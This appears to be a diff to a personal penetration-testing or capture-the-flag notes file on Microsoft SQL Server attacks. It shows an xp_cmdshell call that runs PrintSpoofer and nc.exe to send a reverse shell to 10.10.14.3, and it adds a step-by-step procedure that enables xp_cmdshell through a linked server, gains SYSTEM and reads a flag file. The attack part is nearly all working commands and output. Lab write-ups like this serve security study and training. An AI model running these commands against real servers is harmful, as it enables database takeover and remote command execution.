@@ -312,6 +312,35 @@ SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -
 In kali >  nc -lvnp 1233
 
 Finally get nt/authority system
+
+
+Enable xp_cmdshell with by creating linked_local_server
+----------------------------------------------------------
+
+1.Check linked_local_server
+
+SQL (john  guest@master)> SELECT srvname, isremote FROM sysservers
+
+2. Activate xp_cmdshell
+
+SQL (john  guest@master)> EXEC ('sp_configure ''show advanced options'', 1') AT [LOCAL.TEST.LINKED.SRV]
+INFO(WIN-HARD\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (john  guest@master)> EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
+SQL (john  guest@master)> EXEC ('sp_configure ''xp_cmdshell'',1') AT [LOCAL.TEST.LINKED.SRV]
+INFO(WIN-HARD\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (john  guest@master)> EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
+SQL (john  guest@master)> 
+
+3. Check current user content
+
+SQL (john  guest@master)> EXEC ('xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV]
+output                
+-------------------   
+nt authority\system   
+
+4. Grep flag.txt
+
+SQL (john  guest@master)> EXEC ('xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
 _________________________________________________________________________________________________________________________________________________________________________________________
 Privilege escalation with capabilities
 --------------------------------------
